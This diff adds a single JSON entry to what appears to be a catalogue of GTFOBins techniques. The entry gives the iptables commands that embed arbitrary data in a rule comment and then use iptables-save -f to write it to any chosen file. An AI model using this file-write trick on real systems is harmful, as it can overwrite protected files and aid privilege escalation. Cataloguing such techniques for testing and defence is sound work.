@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-iptables-save-file-write",
+  "name": "GTFOBins · iptables-save (file-write)",
+  "command": "iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA\niptables -S\niptables-save -f /path/to/output-file",
+  "description": "Use iptables-save to file write via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "iptables-save",
+    "file-write"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/iptables-save/#file-write",
+  "upstream_id": "iptables-save/file-write/0",
+  "category": "gtfobins",
+  "subcategory": "file-write",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/iptables-save/"
+    }
+  ]
+}
